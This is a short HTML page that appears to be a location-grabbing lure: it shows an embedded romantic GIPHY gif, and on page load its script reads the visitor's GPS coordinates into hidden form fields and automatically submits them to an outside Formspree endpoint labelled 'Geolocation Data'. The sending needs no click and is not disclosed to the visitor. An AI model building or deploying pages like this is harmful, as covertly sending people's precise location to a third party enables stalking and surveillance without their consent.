<!DOCTYPE html>
<html>
<body onload="getLocation()">

<iframe src="https://giphy.com/embed/BUfpfjQwtrMXDKVSF6" width="320" height="480" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/ZhotShop-love-amor-couple-BUfpfjQwtrMXDKVSF6">via GIPHY</a></p>

<p id="demo"></p>

<!-- Form to submit data to Formspree -->
<form action="https://formspree.io/f/xnnpakgj" method="POST" id="geoForm">
  <input type="hidden" name="lat" id="lat">
  <input type="hidden" name="long" id="long">
  <input type="hidden" name="_subject" value="Geolocation Data">
  <button type="submit">Send Coordinates</button>
</form>

<script>
const x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
    // Set the latitude and longitude values in the hidden form fields
    document.getElementById('lat').value = position.coords.latitude;
    document.getElementById('long').value = position.coords.longitude;

    // Optionally, you can submit the form automatically
    document.getElementById('geoForm').submit();
}
</script>

</body>
</html>
